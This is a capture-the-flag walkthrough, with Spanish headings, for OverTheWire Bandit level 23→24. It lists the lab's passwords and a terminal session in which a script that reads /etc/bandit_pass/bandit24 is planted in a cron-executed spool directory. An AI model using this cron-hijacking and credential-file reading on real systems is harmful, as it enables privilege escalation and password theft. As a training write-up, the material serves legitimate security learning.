# Bandit Level 23 → Level 24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Datos de acceso al nivel
```
bandit23
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

## Solucion
```bash
bandit23@bandit:~$ cd /tmp/kd
bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 >
/tmp/kd/password" > script.sh
bandit23@bandit:/tmp/kd$ cat script.sh
cat /etc/bandit_pass/bandit24 >
/tmp/kd/password
bandit23@bandit:/tmp/kd$ chmod +x script.sh
bandit23@bandit:/tmp/kd$ touch password
bandit23@bandit:/tmp/kd$ chmod 666 password
bandit23@bandit:/tmp/kd$ ls –la
ls: cannot access '–la': No such file or directory
bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/kd$ ls -la
total 10868
drwxrwxrwx   2 bandit23 bandit23     4096 Sep 14 02:25 .
drwxrwx-wt 500 root     root     11116544 Sep 14 02:26 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 14 02:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 14 02:25 script.sh
bandit23@bandit:/tmp/kd$ date
Sat Sep 14 02:26:36 AM UTC 2024
bandit23@bandit:/tmp/kd$ ls -la
total 10868
drwxrwxrwx   2 bandit23 bandit23     4096 Sep 14 02:25 .
drwxrwx-wt 500 root     root     11116544 Sep 14 02:26 ..
-rw-rw-rw-   1 bandit23 bandit23        0 Sep 14 02:25 password
-rwxrwxr-x   1 bandit23 bandit23       49 Sep 14 02:25 script.sh
bandit23@bandit:/tmp/kd$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Notas adicionales



## Referencias